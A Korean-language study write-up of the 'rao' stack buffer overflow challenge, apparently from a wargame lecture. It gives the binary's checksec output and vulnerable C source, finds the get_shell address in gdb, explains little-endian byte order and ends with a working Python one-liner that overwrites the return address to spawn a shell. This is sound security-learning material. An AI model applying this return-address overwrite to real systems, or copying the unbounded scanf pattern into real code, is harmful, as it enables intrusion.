#RAO #엔디언 

### 1. 파일 정보

file ./rao                   
./rao: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=298450dfb7a0f975e175c8e70d1fff1fc1f5b116, not stripped

checksec --file=./rao                   
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols  FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols  No    0               1               ./rao

### 2. C 소스파일 분석
``` c
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

/*
int setvbuf(FILE *stream, char *buf, int mode, size_t size);

표준 입출력 스트림의 버퍼링 방식을 설정합니다.
mode에는 다음 세 가지 값이 올 수 있습니다:
_IONBF (0): 버퍼링 없음 (No buffering)
_IOLBF (1): 줄 단위 버퍼링 (Line buffering)
_IOFBF (2): 전체 버퍼링 (Full buffering)

buf = 0 (사용자 정의 버퍼 없음)
mode = 2 (_IOFBF, 전체 버퍼링)
size = 0 (버퍼 크기를 0으로 설정)
버퍼 모드는 _IOFBF인데, 버퍼 크기가 0이므로 실질적으로는 버퍼링이 꺼진 것과 비슷한 효과를 냅니다.
→ 결과적으로 stdin, stdout이 실시간 입출력처럼 동작합니다.

입력/출력을 빠르게 처리하고, 버퍼링에 의한 지연이나 예측 불가능한 동작을 막기 위해
특히 stdout은 기본적으로 line-buffered이기 때문에, 프롬프트(printf("Input: "))가 출력되지 않는 문제가 생기기도 해요
그래서 버퍼링을 꺼줘야 GDB나 pwntools 같은 도구에서 정확하게 상호작용할 수 있습니다
*/
void init() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}

/*
execve() 함수는 리눅스 시스템 콜 중 하나로, 현재 실행중인 프로세스를 새로운 프로그램으로 완전히 대체하는 역할을 함. 
int execve(const char *pathname, char *const argv[], char *const envp[]);
pathname : 실행할 프로그램의 경로
argv : 프로그램에 전달할 인자 목록(argv[0]은 관례적으로 프로그램 이름)
envp : 환경변수 배열 (NULL이면 기본 환경 없음)

/bin/sh 셀을 실행하고, 인자도 /bin/sh 하나만 준다.
환경변수는 NULL 이므로 빈 환경으로 실행된다. 
*/
void get_shell() {
    char *cmd = "/bin/sh";
    char *args[] = {cmd, NULL};

    execve(cmd, args, NULL);
}

int main() {
    char buf[0x28];

    init();

    printf("Input: ");
    scanf("%s", buf);

    return 0;
}
```

### 3. 익스플로잇 설계

세크먼트 폴트 : 프로그램 실행이 잘못된 주소에 접근할 때 발생하는 에러 메시지

스택프레인 구조 보기
![](https://dreamhack-lecture.s3.amazonaws.com/media/1bb5b0f9b7ad1a97758589ad0121fd410551a03f561fba9c340608c5dbe58fd3.png)

### 4. get_shell()의 주소 확인
```
$ gdb rao -q
pwndbg> print get_shell
$1 = {<text variable, no debug info>} 0x4006aa <get_shell>
pwndbg> quit
```

### 5. 페이로드 구성

익스플로잇에 사용할 페이로드(payload)를 구성해야 한다.
시스템 해킹에서 페이로드는 공격을 위해 프로그램에 전달하는 데이터를 의미함.
![](https://dreamhack-lecture.s3.amazonaws.com/media/d5ed47df7d9c2b0e2cb6786e1023a57d433d578d2c89fb4a02e09bcbd99933b4.png)![](https://dreamhack-lecture.s3.amazonaws.com/media/8459f1aa6a669031717cc91ae7cd98380e0c8ab495aecc19d03b8f7cacfde814.png)

### 6. 엔디언 적용

구성한 페이로드는 적절한 엔디언(Endian)을 적용해서 프로그램에 전달해야 함.
엔디언은 메모리에서 데이터가 정렬되는 방식으로 주로 리틀 엔디언(Little Endian)과 빅 엔디언(Big Endian)이 사용됨
리틀 엔디언에서는 데이터의 Most Significant Byte(MSB: 가장 왼쪽의 바이트)가 가장 높은 주소에 저장되고, 빅 엔디언에서는 데이터의 MSB가 가장 낮은 주소에 저장된다.

예를 들어, 0x12345678 은 
![](https://dreamhack-lecture.s3.amazonaws.com/media/a2090442e76494b8e884510f28855215668142f9662e6bcfa2858e3bf502f76a.png)
과 같이 저장된다.

### 7. 엔디언 테스트
``` c
// Name: endian.c
// Compile: gcc -o endian endian.c

#include <stdio.h>
int main() {
  unsigned long long n = 0x4006aa;

  printf("Low <-----------------------> High\n");

  for (int i = 0; i < 8; i++) printf("0x%hhx ", *((unsigned char*)(&n) + i));

  return 0;
}
```

``` c
$ ./endian
Low <-----------------------> High
0xaa 0x6 0x40 0x0 0x0 0x0 0x0 0x0
```

### 8. 익스플로잇
```
$ (python -c "import sys;sys.stdout.buffer.write(b'A'*0x30 + b'B'*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')";cat)| ./rao
$ id
id
uid=1000(rao) gid=1000(rao) groups=1000(rao)
```

1.( ... ; ... )
   - 괄호 안의 명령어들을 서브셸에서 순차적으로 실행하고,
   - 그 출력 결과를 하나로 합침
   - 즉, python ... -> 그 다음 cat 순으로 실행한 뒤 결과를 파이프로 ./rao 에 전달함
2.python -c " ... "
- -c 옵션은 파이썬 코드를 문자렬로 직접 실행한다는 뜻.
- b'A'*0x30 -> 문자 A(0x41)를 0x30(=48)번 출력
- b'B'*0x8 -> 문자 B(0x42)를 8번 출력
- b'\xaa\x06\x40\x00\x00\x00\x00\x00' -> 64비트 리틀엔디언 주소값을 출력
3.cat
- python이 출력한 페이로드 뒤에 추가 입력을 대기시켜주기 위해 붙임
- cat만 있으면, 사용자가 키보드에서 계속 입력할 수 있고 그 입력도 ./rao 로 넘어감
- 즉, 프로그램이 추가 입력을 요구해도 죽지 않고 계속 테스트 가능
4.| ./rao
- 앞에서 만든 출력(페이로드 + cat입력)을 ./rao 라는 실행 파일의 표준 입력(stdin)으로 전달.

